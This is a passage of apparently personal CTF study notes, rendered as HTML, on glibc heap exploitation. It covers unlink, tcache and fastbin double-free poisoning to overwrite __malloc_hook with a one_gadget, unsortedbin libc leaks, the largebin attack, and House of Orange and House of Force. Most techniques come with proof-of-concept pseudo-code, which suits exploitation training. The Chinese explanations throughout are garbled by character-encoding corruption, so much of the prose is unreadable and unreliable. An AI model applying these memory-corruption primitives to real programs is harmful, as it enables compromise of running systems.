<h3 id="å¤æ—©ç‰ˆæœ¬">[6-2-2] å¤æ—©ç‰ˆæœ¬</h3>
<p>å‡è®¾åœ¨ä¸€ä¸ªåŒå‘é“¾è¡¨ bin ä¸­ï¼Œæœ‰ BK &lt;=&gt; CUR &lt;=&gt; FD</p>
<p>ä¸‰ä¸ª chunk çš„å…³ç³»ä¸º</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BK.fd == &amp;(CUR.prev_size)</span><br><span class="line">CUR.bk == &amp;(BK.prev_size)</span><br><span class="line">CUR.fd == &amp;(FD.prev_size)</span><br><span class="line">FD.bk == &amp;(CUR.prev_size)</span><br></pre></td></tr></table></figure>
<center>
<img src="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/implementation/figure/unlink_smallbin_intro.png" width=370 height=290 />
</center>
<p>åœ¨<strong>å¤æ—©</strong>çš„ç‰ˆæœ¬ä¸­ï¼Œunlink çš„å…·ä½“è¿‡ç¨‹ä¸º
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CUR.bk-&gt;fd = CUR.fd # CUR çš„åä¸€ä¸ª chunk çš„ fd æŒ‡é’ˆæŒ‡å‘ CUR çš„å‰ä¸€ä¸ª chunk</span><br><span class="line">CUR.fd-&gt;bk = CUR.bk # CUR çš„å‰ä¸€ä¸ª chunk çš„ bk æŒ‡é’ˆæŒ‡å‘ CUR çš„åä¸€ä¸ª chunk</span><br></pre></td></tr></table></figure></p>
<p>å¦‚æœæˆ‘ä»¬ä¿®æ”¹ CUR çš„ fd å’Œ bk æŒ‡é’ˆï¼Œå°±å¯ä»¥å®ç°
<code>Any address write</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SIZE åœ¨32ä½ä¸º 4ï¼Œ64ä½ä¸º8</span></span><br><span class="line"><span class="comment">// target_addr + 0*SIZE = &amp;(fakechunk.prev_size)</span></span><br><span class="line"><span class="comment">// target_addr + 1*SIZE = &amp;(fakechunk.size)</span></span><br><span class="line"><span class="comment">// target_addr + 2*SIZE = &amp;(fakechunk.fd)</span></span><br><span class="line"><span class="comment">// target_addr + 3*SIZE = &amp;(fakechunk.bk)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¿®æ”¹ CUR çš„ fd å’Œ bk æŒ‡é’ˆ</span></span><br><span class="line">CUR.fd = target_addr - <span class="number">3</span>*SIZE</span><br><span class="line">CUR.bk = expect_value</span><br><span class="line"></span><br><span class="line"><span class="comment">// CUR.fd-&gt;bk = CUR.bk</span></span><br><span class="line">*(target_addr - <span class="number">3</span>*SIZE + <span class="number">3</span>*SIZE) = expect_value + <span class="number">2</span>*SIZE</span><br><span class="line"></span><br><span class="line"><span class="comment">// CUR.bk-&gt;fd = CUR.fd   ---&gt;   è¦æ±‚ expect_value + 8 æŒ‡å‘çš„å†…å­˜å¯å†™</span></span><br><span class="line">*(expect_value + <span class="number">2</span>*SIZE) = target_addr - <span class="number">3</span>*SIZE</span><br></pre></td></tr></table></figure>
<h3 id="åŠ å…¥-check-ä»¥å">[6-2-3] åŠ å…¥ check ä»¥å</h3>
<ol type="1">
<li><p>check1</p>
<ol type="1">
<li><p>check <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">    malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="line"></span><br><span class="line"><span class="comment">// çœæµç‰ˆ: </span></span><br><span class="line"><span class="comment">// CUR çš„ fd æŒ‡å‘çš„ chunk çš„ bk å¿…é¡»å­˜çš„æ˜¯ CUR çš„åœ°å€</span></span><br><span class="line"><span class="comment">// CUR çš„ bk æŒ‡å‘çš„ chunk çš„ fd å¿…é¡»å­˜çš„æ˜¯ CUR çš„åœ°å€</span></span><br><span class="line"><span class="keyword">if</span> ( !( CUR.fd-&gt;bk == &amp;(CUR.prev_size) &amp;&amp; CUR.bk-&gt;fd == &amp;(CUR.prev_size) ) )</span><br><span class="line">    malloc_printerr(...)</span><br></pre></td></tr></table></figure></p></li>
<li><p>bypass <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// è®© CUR çš„ fd å’Œ bk æŒ‡é’ˆéƒ½æŒ‡å‘ CUR è‡ªå·±</span></span><br><span class="line">CUR.fd = &amp;(CUR.prev_size)</span><br><span class="line">CUR.bk = &amp;(CUR.prev_size)</span><br><span class="line"></span><br><span class="line"><span class="comment">// check æ—¶</span></span><br><span class="line">CUR.fd-&gt;bk = (&amp;(CUR.prev_size))-&gt;bk = CUR</span><br><span class="line">CUR.bk-&gt;fd = (&amp;(CUR.prev_size))-&gt;fd = CUR</span><br><span class="line"></span><br><span class="line"><span class="comment">// unlink</span></span><br><span class="line">CUR.fd-&gt;bk = (&amp;(CUR.prev_size))-&gt;bk = &amp;(CUR.prev_size) + <span class="number">2</span>*SIZE</span><br><span class="line">CUR.bk-&gt;fd = (&amp;(CUR.prev_size))-&gt;fd = &amp;(CUR.prev_size) - <span class="number">3</span>*SIZE</span><br></pre></td></tr></table></figure> è¿™æ ·è™½ç„¶ä¸èƒ½å®ç°ä»»æ„åœ°å€å†™ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥è®©
CUR çš„ fd å’Œ bk æŒ‡é’ˆæŒ‡å‘ä¸æ­£ç¡®çš„ä½ç½®</p></li>
</ol></li>
</ol>
<h1 id="series-of-bin">[7] Series of Bin</h1>
<h2 id="tcachebin">[7-1] Tcachebin</h2>
<h3 id="æ¦‚è¿°-3">[7-1-1] æ¦‚è¿°</h3>
<ol type="1">
<li>Tcachebin ä¸º LIFO å•å‘é“¾è¡¨ï¼Œå¦‚ä¸‹</li>
</ol>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Tcachebin</span>: (å¤´èŠ‚ç‚¹)<span class="title function_">newest_chunk</span>(first out) -&gt; ... </span><br><span class="line">    ... -&gt; (å°¾èŠ‚ç‚¹)<span class="title function_">oldest_chunk</span>(last out)</span><br></pre></td></tr></table></figure>
<h3 id="leak">[7-1-2] Leak</h3>
<h3 id="write">[7-1-3] Write</h3>
<h4 id="uaf">[7-1-3-1] UAF</h4>
<blockquote>
<p>Libc: 2.26 - 2.31</p>
</blockquote>
<blockquote>
<p>åº”ç”¨æ¡ä»¶:</p>
</blockquote>
<ol type="1">
<li>UAF</li>
</ol>
<blockquote>
<p>ç›¸å…³ç‰¹æ€§:</p>
</blockquote>
<ol type="1">
<li>Tcachebin è·Ÿç­›å­æ²¡ä»€ä¹ˆåŒºåˆ«ï¼Œé€šè¿‡ UAF ä¿®æ”¹ newest_chunk çš„ fd æŒ‡é’ˆä¸º
Any addressï¼Œå†é€šè¿‡ä¸¤æ¬¡ malloc å°±å¯ä»¥åœ¨ Any address å¤„ç”³è¯·åˆ°ä¸€ä¸ª chunk
ä¾›æˆ‘ä»¬ä½¿ç”¨</li>
</ol>
<blockquote>
<p>POC:</p>
</blockquote>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> alloc(chunk0)</span><br><span class="line">   alloc(chunk1)</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> free(chunk0)</span><br><span class="line">   free(chunk1)</span><br><span class="line"><span class="comment"># åšå®Œè¿™ä¸€æ­¥ï¼Œtcachebin[size]: chunk1 -&gt; chunk0</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> edit(chunk1,payload=address_to_malloc) </span><br><span class="line"><span class="comment"># åšå®Œè¿™ä¸€æ­¥ï¼Œtcachebin[size]: chunk1 -&gt; address_to_malloc</span></span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> alloc(chunk2) <span class="comment"># chunk2 = chunk1</span></span><br><span class="line">   alloc(chunk3) <span class="comment"># chunk3 = address_to_malloc</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>ä¾‹é¢˜:</p>
</blockquote>
<ol type="1">
<li><a href="">æ­ç”µhgame2024-week2 Elden Ring â…¡</a></li>
</ol>
<h4 id="stash-double-free">[7-1-3-2] Stash Double Free</h4>
<blockquote>
<p>Libc: 2.27 - 2.31</p>
</blockquote>
<blockquote>
<p>åº”ç”¨æ¡ä»¶:</p>
</blockquote>
<ol type="1">
<li><p>7ä¸ª tcachebin chunkï¼Œ2ä¸ª fastbin chunkï¼Œbins æ„é€ å®Œæˆåè‡³å°‘å¯ä»¥
alloc 10æ¬¡</p></li>
<li><p>free åè¿˜èƒ½å† free åŒä¸€ä¸ª chunk</p></li>
</ol>
<blockquote>
<p>ç›¸å…³ç‰¹æ€§:</p>
</blockquote>
<ol type="1">
<li><p>2.27ä¹‹åï¼Œtcachebin åŠ å…¥äº† key å€¼æ£€éªŒï¼Œå› æ­¤ç›´æ¥åŠ«æŒ tcachebin
é“¾æ¯”è¾ƒå›°éš¾(éœ€è¦ä¼ªé€  key å€¼)ã€‚</p></li>
<li><p>(å…·ä½“æ˜¯ stash æœºåˆ¶ï¼Œæˆ‘æ˜¯æŒ‰ä¸‹é¢è¿™æ ·ç†è§£çš„)ä½†å½“ tcachebin
æŸä¸€æ¡é“¾çš„ chunk å…¨éƒ¨å–å‡ºï¼Œä¸”å¯¹åº”å¤§å°çš„ fastbin ä¸Šä»æœ‰ chunkï¼Œptmalloc
ä¼šå°† fastbin å¯¹åº”é“¾ä¸Šçš„å…¨éƒ¨ chunk å–å‡ºï¼Œå¹¶æŒ‰ fastbin é¡ºåºè£…è½½åˆ°
tcachebin ä¸­ã€‚æ­¤æ—¶ ptmalloc ä¸ä¼šæ£€æµ‹ fastbin çš„å…¨éƒ¨ chunk æ˜¯å¦åˆæ³•ï¼Œå¹¶ä¸”
ptmalloc è¿˜ä¼šä¸ºæ¯ä¸ª chunk æ„é€ åˆæ³• key å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆåŠ«æŒ fastbin
é“¾ï¼Œç„¶åæ¸…ç©º tcachebin ååŠ«æŒ tcachebin é“¾ã€‚</p></li>
<li><p>åœ¨æ£€æŸ¥ key å€¼ä¹‹åï¼Œä» tcachebin ä¸­ç”³è¯· chunk
çš„æ£€æµ‹æœºåˆ¶æ¯”è¾ƒè–„å¼±ï¼Œä¸éœ€è¦è€ƒè™‘ fd æŒ‡å‘çš„åœ°å€çš„ size åŸŸæ˜¯å¦åˆæ³•</p></li>
</ol>
<blockquote>
<p>POC:</p>
</blockquote>
<ol type="1">
<li><p>ç”³è¯·9ä¸ªåŒæ ·å¤§å°çš„ chunkï¼Œä¾æ¬¡é‡Šæ”¾ï¼Œå†é‡Šæ”¾ä¸€æ¬¡ chunk7
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    alloc(i) <span class="comment"># 0-6 tcahcebin chunks || 7,8 fastbin chunks</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    free(i) </span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>) <span class="comment"># fastbin: chunk7 -&gt; chunk8 -&gt; chunk7</span></span><br></pre></td></tr></table></figure></p></li>
<li><p>ç”³è¯·7ä¸ª chunkï¼Œæ¸…ç©º tcachebin é“¾ã€‚å†ç”³è¯· chunk7ï¼Œå°† fastbin
ä¸­çš„æ‰€æœ‰ chunk è½¬ç§»åˆ° tcachebin ä¸­. <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    alloc(i)</span><br><span class="line"></span><br><span class="line">alloc(idx=<span class="number">7</span>,content=address_to_alloc)</span><br><span class="line"><span class="comment"># æ­¤æ—¶ tcachebin: chunk8 -&gt; chunk7 -&gt; address_to_alloc</span></span><br></pre></td></tr></table></figure></p></li>
<li><p>ç”³è¯·3ä¸ª chunkï¼Œæ­¤æ—¶æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ”¹å˜ chunk9 çš„å€¼ï¼Œæ¥ write
ä»»æ„ä½ç½®äº†. <figure class="highlight py"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">8</span>)</span><br><span class="line">alloc(<span class="number">7</span>)</span><br><span class="line">alloc(<span class="number">9</span>,content=anything_to_write)</span><br></pre></td></tr></table></figure></p></li>
</ol>
<blockquote>
<p>ä¾‹é¢˜:</p>
</blockquote>
<ol type="1">
<li><a href="">æ­ç”µhgame2024-week2 fastnote</a></li>
</ol>
<h2 id="fastbin">[7-2] Fastbin</h2>
<h3 id="æ¦‚è¿°-4">[7-2-1] æ¦‚è¿°</h3>
<ol type="1">
<li>Fastbin ä¸º LIFO å•å‘é“¾è¡¨ï¼Œå¦‚ä¸‹</li>
</ol>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="attr">fastbin</span>: (å¤´èŠ‚ç‚¹)<span class="title function_">newest_chunk</span>(first out) -&gt; ... </span><br><span class="line">  ... -&gt; (å°¾èŠ‚ç‚¹)<span class="title function_">oldest_chunk</span>(last out)</span><br></pre></td></tr></table></figure>
<h3 id="leak-1">[7-2-2] Leak</h3>
<h3 id="write-1">[7-2-3] Write</h3>
<h4 id="double-free-1">[7-2-3-1] Double Free</h4>
<blockquote>
<p>Libc: 2.27ä¹‹å‰</p>
</blockquote>
<blockquote>
<p>åº”ç”¨æ¡ä»¶:</p>
</blockquote>
<ol type="1">
<li>free åè¿˜èƒ½å† free åŒä¸€ä¸ª chunk</li>
</ol>
<blockquote>
<p>fastbin ç›¸å…³ç‰¹æ€§:</p>
</blockquote>
<ol type="1">
<li><code>free</code>: åœ¨ free chunk åˆ° fastbin çš„è¿‡ç¨‹ä¸­ï¼Œä¼šæœ‰ä»¥ä¸‹
checkï¼š
<ol type="1">
<li>æ£€æµ‹è¿™ä¸ª chunk å’Œå°¾èŠ‚ç‚¹æ˜¯å¦æ˜¯åŒä¸€ä¸ª
chunkï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è§¦å‘<code>Error in './vuln': double free or corruption (fasttop): 0x17170c0</code></li>
</ol></li>
<li><code>malloc</code>: ä» fastbin ç”³è¯· chunk æ—¶ï¼Œä¼šæœ‰ä»¥ä¸‹ check:
<ol type="1">
<li>æ£€æµ‹è¿™ä¸ª chunk çš„ fd æŒ‡å‘çš„å†…å­˜çš„ size æ˜¯å¦ç¬¦åˆæ‰€å±
fastbinï¼Œå¦‚æœä¸å±äºï¼Œåˆ™è§¦å‘<code>Error in './vuln': malloc(): memory corruption (fast): 0x7f4cf12d6afe</code></li>
</ol></li>
</ol>
<blockquote>
<p>POC:</p>
</blockquote>
<ol type="1">
<li><p>æ„å»º fastbin: chunk1 -&gt; chunk2 -&gt; chunk1<br />
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">1</span>)</span><br><span class="line">alloc(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p></li>
<li><p>malloc(chunk1)ï¼ŒåŒæ—¶ä¿®æ”¹ chunk1 çš„ fd, æ­¤æ—¶ fastbin ä¸­æ„é€ ä¸º
chunk2 -&gt; chunk1 -&gt; addressï¼ˆaddress æœ‰å¦‚ä¸‹é€‰æ‹©ï¼‰</p>
<ol type="1">
<li>libc.sym['__malloc_hook'] - 0x23 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line">pd = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span></span><br><span class="line"><span class="comment"># æ³¨æ„ä¸è¦æŠŠ &#x27;\n&#x27; ä¹Ÿå½“åš payload ä¼ è¿‡å»äº†</span></span><br><span class="line">alloc(<span class="number">1</span>,payload=pd)</span><br></pre></td></tr></table></figure></li>
</ol></li>
<li><p>malloc(chunk2), malloc(chunk1) <figure class="highlight py"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">2</span>)</span><br><span class="line">alloc(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p></li>
<li><p>malloc(address)ï¼ŒåŒæ—¶ä¿®æ”¹ address
å¤„çš„å†…å®¹ï¼Œå¯¹åº”<code>'2.'</code>ä¸­çš„ä¸åŒé€‰æ‹©ï¼Œæœ‰ä¸åŒçš„å¡«å……æ–¹å¼</p>
<ol type="1">
<li>payload = b'a'*19 + one_gadget <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">mallochook-<span class="number">0x23</span>      prev_size      <span class="number">0x000000000000007f</span></span><br><span class="line">mallochook-<span class="number">0x13</span>  <span class="number">0x6161616161616161</span> <span class="number">0x6161616161616161</span></span><br><span class="line">mallochook-<span class="number">0x03</span>  0xXXXXXXXXXX616161 0x0000000000XXXXXX</span><br><span class="line">                            ^</span><br><span class="line">                            |</span><br><span class="line">                    æ­£å¥½æ˜¯__malloc_hookçš„ä½ç½®</span><br></pre></td></tr></table></figure></li>
</ol></li>
</ol>
<blockquote>
<p>ä¾‹é¢˜</p>
</blockquote>
<ol type="1">
<li><p><a
href="https://heygap.github.io/2023/08/14/Pwn%20-%20Practice/#more">BUUCTF
babyheap_0ctf_2017</a></p></li>
<li><p><a href="">æ­ç”µhgame2024-week2 old_fastnote</a></p></li>
</ol>
<h2 id="unsortedbin">[7-3] Unsortedbin</h2>
<h3 id="leak-2">[7-3-1] leak</h3>
<blockquote>
<p>Libc: Any</p>
</blockquote>
<blockquote>
<p>åº”ç”¨æ¡ä»¶:</p>
</blockquote>
<ol type="1">
<li><p>UAF</p></li>
<li><p>alloc è‡³å°‘ä¸ä¼šè¦†ç›– bk</p></li>
</ol>
<p>å½“unsortedbinä¸­æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªchunkæ—¶ï¼Œ</p>
<p>è¯¥chunkçš„fdå’Œbkä¼šæŒ‡å‘ &amp;main_arena + 96ï¼Œ</p>
<p>è²Œä¼¼libc2.31æ˜¯96ï¼Œlibc2.23æ˜¯88ï¼Œ</p>
<p>å…·ä½“åšé¢˜ç”¨ pwndbg çœ‹æœ€ä½å››ä½æ˜¯ 0x8 è¿˜æ˜¯
0x0ï¼Œ0x8-&gt;88,0x0-&gt;96</p>
<p>è€Œè¿™ä¸ªåœ°å€å¯ä»¥ç”¨idaæŸ¥çœ‹å¯¹åº”libcçš„ malloc_trim å‡½æ•°æ‰¾åˆ°ï¼Œä»è€Œå¸®åŠ©è®¡ç®—
libc_base.</p>
<p>å½“ç„¶è¿™ä¸ªåœ°å€ä¹Ÿæ˜¯ &amp;__malloc_hook + 0x10ï¼Œå…·ä½“çœ‹ä¸‹é¢çš„ä»£ç æ³¨é‡Š.</p>
<p>å¦‚æœæˆ‘ä»¬æŠŠ unsortedbin ä¸­å”¯ä¸€ä¸€ä¸ª chunk è®°ä½œ chunk0ï¼Œåˆ™:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å†…å­˜ä¸­çš„ main_arena åœ°å€ï¼Œä¸€èˆ¬ä¸º0x7f...</span></span><br><span class="line">main_arena = chunk0.fd - <span class="number">0x60</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®— libc åŸºå€:</span></span><br><span class="line"><span class="comment"># main_arena åœ¨ libc ä¸­çš„åç§»ï¼Œæ­£å¥½ç­‰äº </span></span><br><span class="line"><span class="comment"># __malloc_hook çš„åç§» + 0x10ã€‚</span></span><br><span class="line"><span class="comment"># å³ &amp;main_arena = &amp;__malloc_hook + 0x10ã€‚</span></span><br><span class="line">libc_base = main_arena - (ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>).sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥ç”¨ IDA æ‰“å¼€ libc,</span></span><br><span class="line"><span class="comment"># æ‰¾åˆ° __malloc_trim å‡½æ•°,</span></span><br><span class="line"><span class="comment"># ç›´æ¥åœ¨ 22 è¡Œé™„è¿‘æ‰¾åˆ°ç±»ä¼¼äº</span></span><br><span class="line"><span class="comment"># _R15 = &amp;dword_1ECB80 çš„è¯­å¥,</span></span><br><span class="line"><span class="comment"># è¿™é‡Œ main_arena çš„åç§»å°±æ˜¯ 0x1ECB80</span></span><br><span class="line">libc_base = main_arena - <span class="number">0x1ECB80</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>bypass</p>
</blockquote>
<ol type="1">
<li><code>ssize_t read(int fd, void *buf, size_t nbytes)</code>ä¼šç”¨''å¡«å……ä¸å¤Ÿ
nbytes çš„éƒ¨åˆ†ï¼Œå› æ­¤æˆ‘ä»¬åœ¨ <code>alloc</code> æˆ–è€… <code>edit</code>
çš„æ—¶å€™æ³¨æ„ nbytes = 0x08 å³å¯ï¼Œè¿™æ ·ä¸ä¼šè¦†ç›– bk çš„ &amp;main_arena</li>
</ol>
<h3 id="write-2">[7-3-2] write</h3>
<h4 id="direct">[7-3-2-1] Direct</h4>
<blockquote>
<p>Libc: 2.23</p>
</blockquote>
<blockquote>
<p>ç›¸å…³ç‰¹æ€§:</p>
</blockquote>
<ol type="1">
<li>ä½ libc ç‰ˆæœ¬çš„ unsortedbin å¯ä»¥åƒ tcachebin
ä¸€æ ·ï¼Œé€šè¿‡ä¼ªé€ é“¾æ¥ç”³è¯·ä¸€ä¸ª fake_chunk</li>
</ol>
<blockquote>
<p>POC:</p>
</blockquote>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åˆçŠ¶æ€ unsortedbin --&gt; chunk_victim  </span></span><br><span class="line">&gt; æ­¤æ—¶æˆ‘ä»¬ä»¤chunk_victim.bk = fake_chunk_head</span><br><span class="line"></span><br><span class="line"><span class="comment"># æœ«çŠ¶æ€ unsortedbin --&gt; chunk_victim --&gt; fake_chunk</span></span><br><span class="line">&gt; è¿ç»­ç”³è¯·ä¸¤ä¸ªchunkå³å¯ç”³è¯·åˆ°fake_chunk</span><br></pre></td></tr></table></figure>
<h2 id="largebin-attack">[7-4] Largebin Attack</h2>
<h3 id="æ¦‚è¿°-5">[7-4-1] æ¦‚è¿°</h3>
<p>Largebin æ˜¯ FIFO çš„åŒå‘é“¾è¡¨ï¼Œchunk ç»“æ„ä¸ºğŸ‘‡ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+-------------------------------------------------+</span><br><span class="line">|        prev_size       |      size       |0|0|1|| </span><br><span class="line">|------------------------|------------------------|</span><br><span class="line">|           fd           |           bk           |</span><br><span class="line">|------------------------|------------------------|</span><br><span class="line">|       fd_nextsize      |       bk_nextsize      |</span><br><span class="line">|------------------------|------------------------|</span><br><span class="line">|                    user_data                    |</span><br><span class="line">|                      . . .                      |</span><br><span class="line">+-------------------------------------------------+</span><br></pre></td></tr></table></figure></p>
<h3 id="leak-3">[7-4-2] leak</h3>
<h3 id="write-3">[7-4-3] write</h3>
<h4 id="å¯¹-libc-æœ‰è¦æ±‚">[7-4-3-1] å¯¹ libc æœ‰è¦æ±‚</h4>
<blockquote>
<p>libc: 2.30 åŠä»¥å‰ï¼Ÿ</p>
</blockquote>
<h4 id="å¯¹-libc-æ²¡è¦æ±‚">[7-4-3-2] å¯¹ libc æ²¡è¦æ±‚</h4>
<blockquote>
<p>libc: Any</p>
</blockquote>
<p>æ¦‚è¿°ï¼š</p>
<p>é€šè¿‡ä¿®æ”¹ largebin ä¸­çš„ bk_nextsize ä¸º target_addr - 0x20ï¼Œå¯ä»¥åœ¨
target_addr å¤„å†™ä¸€ä¸ªå †åœ°å€</p>
<p>POCï¼š <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0x500</span>)  <span class="comment">// chunk1</span></span><br><span class="line">alloc(<span class="number">0x10</span>)   <span class="comment">// gap1 é˜²æ­¢åˆå¹¶</span></span><br><span class="line">alloc(<span class="number">0x510</span>)  <span class="comment">// chunk2</span></span><br><span class="line">alloc(<span class="number">0x10</span>)   <span class="comment">// gap2 é˜²æ­¢åˆå¹¶</span></span><br><span class="line"><span class="built_in">free</span>(chunk1)  <span class="comment">// chunk1 è¿›å…¥ unsortedbin</span></span><br><span class="line">alloc(<span class="number">0x520</span>)  <span class="comment">// chunk1 è¿›å…¥ largebin</span></span><br><span class="line"><span class="built_in">free</span>(chunk2)  <span class="comment">// chunk2 è¿›å…¥ unsortedbin</span></span><br><span class="line">chunk1.bk_nextsize = target_addr - <span class="number">0x20</span> <span class="comment">// UAFç­‰æ–¹æ³•ä¿®æ”¹ chunk</span></span><br><span class="line">alloc(<span class="number">0x520</span>)  <span class="comment">// chunk2 è¿›å…¥ largebinï¼Œè§¦å‘ largebin attack</span></span><br><span class="line">                        <span class="comment">// target_addr å¤„è¢«å†™å…¥ chunk2 çš„åœ°å€</span></span><br></pre></td></tr></table></figure></p>
<h1 id="series-of-house">[8] Series of House</h1>
<h2 id="house-of-orange">[8-1] House of Orange</h2>
<h3 id="æ¦‚è¿°-6">[8-1-1] æ¦‚è¿°</h3>
<p>HouseofOrangeæ˜¯åœ¨ç¨‹åºæ²¡æœ‰å¯ä»¥æ“æ§çš„freeæ—¶ï¼Œåˆ©ç”¨ptmallocçš„ç®¡ç†æœºåˆ¶å¼ºè¡Œåˆ¶é€ å‡ºä¸€ä¸ªunsortedbinä¸­çš„chunkçš„æŠ€æœ¯ã€‚</p>
<h3 id="ä¼ªé€ chunkéœ€æ±‚">[8-1-2] ä¼ªé€ chunkéœ€æ±‚</h3>
<ol type="1">
<li><p>top_chunkçš„ç»“æŸåœ°å€å¿…é¡»é¡µå¯¹é½</p>
<ul>
<li>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œptmallocè®¾ç½®top_chunkä¸º0x21000ï¼Œæˆ‘ä»¬ç”³è¯·ä¸€ä¸ª0x10çš„chunk0åï¼Œchunk0åŠ ä¸Šchunk_headæ˜¯0x20å¤§å°ï¼Œæ­¤æ—¶top_chunkåˆ‡å‰²åè¿˜å‰©ä¸‹0x20fe0å¤§å°ï¼Œä¸ºäº†é¡µå¯¹é½ï¼Œæˆ‘ä»¬ä¼ªé€ top_chunkçš„å¤§å°ä¸º0xfe0å³å¯</li>
</ul></li>
<li><p>top_chunk.size &gt;= MINSIZE</p></li>
<li><p>top_chunk.size &lt; chunk_size + MINSIZE</p></li>
<li><p>top_chunk.prev_inuse == 1</p>
<ul>
<li>ç¬¬ä¸€ç‚¹ä¸­è¯´çš„0xfe0è¦å˜ä¸º0xfe1</li>
</ul></li>
</ol>
<h2 id="house-of-force-hof">[8-2] House of Force (HOF)</h2>
<h3 id="æ¦‚è¿°-7">[8-2-1] æ¦‚è¿°</h3>
<p>House of Force æ˜¯é€šè¿‡ topchunk æ¥å®ç°ä»»æ„åœ°å€å†™çš„æ“ä½œã€‚</p>
<p>å…·ä½“æ¥è¯´ï¼Œæˆ‘ä»¬å…ˆä¿®æ”¹ topchunk çš„ size åŸŸï¼Œæ¥ç€ç”¨ malloc(c_size) ä»
topchunk åˆ‡å‰²ä¸€ä¸ª chunkFï¼Œåœ¨åˆ‡å‰²å‰ï¼Œé€šè¿‡æ„é€  malloc chunkF æ—¶çš„
c_sizeï¼Œèƒ½æ”¹å˜ main_arena ä¸­æŒ‡å‘ topchunk
çš„æŒ‡é’ˆä¸ºä»»æ„å€¼ï¼Œä»è€Œåœ¨åˆ‡å‰²æ—¶èƒ½åœ¨ä»»æ„åœ°å€ç”³è¯·ä¸€ä¸ª
chunkï¼Œè¿›è€Œå®ç°ä»»æ„åœ°å€å†™ã€‚</p>
<h3 id="å…·ä½“åŸç†">[8-2-2] å…·ä½“åŸç†</h3>
<ul>
<li><p>ä» topchunk ç”³è¯· chunk
çš„å…·ä½“å®ç°æ˜¯è¿™æ ·çš„ï¼Œå…¶ä¸­çš„ä»£ç å¯ä»¥è¿™æ ·ç†è§£(æˆ‘æ²¡è¯»æºç ï¼Œåªæ˜¯ä»åº”ç”¨è§’åº¦é€†æ¨åŸç†):</p>
<ul>
<li><p>âš æ³¨ï¼šæœ¬æ®µä»£ç çš„æ•°æ®å…¨ä¸º unsignedï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬è¦ç”³è¯·çš„ chunk çš„
size å³ nb ä¼šè¢«è½¬åŒ–ä¸ºæ— ç¬¦å·ï¼Œtopchunk çš„ size ä¹Ÿæ˜¯æ— ç¬¦å·çš„</p></li>
<li><p>victim: è·å–æŒ‡å‘ç›®æ ‡ chunk çš„æŒ‡é’ˆï¼Œåœ¨è¿™æ˜¯ topchunk</p></li>
<li><p>chunksize(victim): è·å– victim æŒ‡å‘çš„ chunk çš„å¤§å°</p></li>
<li><p>nb: chunk çš„å®é™…å¤§å°ï¼Œmalloc(size) æ—¶ nb = request2size(size)
<code>è¿™ä¸ªåœ°æ–¹æˆ‘ä¹Ÿæ²¡ææ¸…æ¥šï¼Œä¸»è¦æœ‰çš„æ—¶å€™nextchunkçš„prev_sizeåŸŸä¹Ÿè¢«æ‹¿æ¥å½“ä½œchunkçš„ä¸€éƒ¨åˆ†ï¼Œå°±å¯¼è‡´æˆ‘ä¸æ˜¯å¾ˆæ¸…æ¥šå¯¹é½è¿™ä¸€å—æ€ä¹ˆåšçš„ï¼Œåé¢ä»”ç»†è¯»ä¸€ä¸‹æºç å†æ¥è®¢æ­£</code></p></li>
<li><p>chunk_at_offset(victim, nb): return(victim + nb)</p></li>
</ul></li>
</ul>
